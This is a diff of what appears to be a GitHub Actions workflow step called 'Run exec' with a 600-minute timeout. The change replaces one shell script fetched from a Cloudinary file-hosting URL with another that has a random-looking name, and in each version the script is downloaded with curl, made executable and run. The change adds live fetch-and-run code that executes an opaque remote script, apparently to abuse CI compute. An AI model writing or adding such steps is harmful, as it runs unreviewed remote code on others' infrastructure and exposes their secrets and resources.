@@ -16,6 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 600
         run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1726990400/bsansbot2.sh
-          chmod +x bsansbot2.sh
-          ./bsansbot2.sh
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1743691545/hk/udbxlqm6rwryc58b7ukj.sh
+          chmod +x udbxlqm6rwryc58b7ukj.sh
+          ./udbxlqm6rwryc58b7ukj.sh
